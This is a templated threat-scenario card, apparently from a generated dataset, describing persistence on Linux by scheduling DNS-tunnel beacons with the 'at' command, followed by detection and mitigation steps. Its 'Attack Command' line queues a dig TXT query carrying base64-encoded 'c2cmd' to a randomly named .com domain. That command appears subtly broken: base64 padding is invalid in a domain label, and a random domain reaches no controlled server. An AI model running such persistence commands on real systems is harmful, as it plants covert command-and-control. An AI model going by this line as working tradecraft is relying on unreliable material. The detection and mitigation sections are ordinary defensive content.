---
type: campaign
scenario_id: 493
tactic: Persistence
technique: "T1053.002: At (Linux)"
technique_id: T1053.002
tags: [campaign, lotl, persistence]
---

# Using at command for DNS tunneling persistence on Linux.

## Threat Description
Using at command for DNS tunneling persistence on Linux.

## Attack Command
```
echo "dig +short TXT $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com) > /dev/null" | at now + 5 minutes
```

## Detection Logic
Monitor at jobs: `atq | grep dig`; Audit file changes: `auditctl -w /var/spool/at -p wa`.

## Mitigation
Restrict at: `chmod 700 /usr/bin/at`; Disable at daemon: `systemctl disable atd`.

## AI Training Prompt
Train AI to detect at-based DNS tunneling persistence by analyzing dig TXT commands, at job configurations, and DNS query patterns; suggest at restrictions.

## References
- MITRE ATT&CK T1053.002: https://attack.mitre.org/techniques/T1053/002/
- CWE-732: https://cwe.mitre.org/data/definitions/732.html
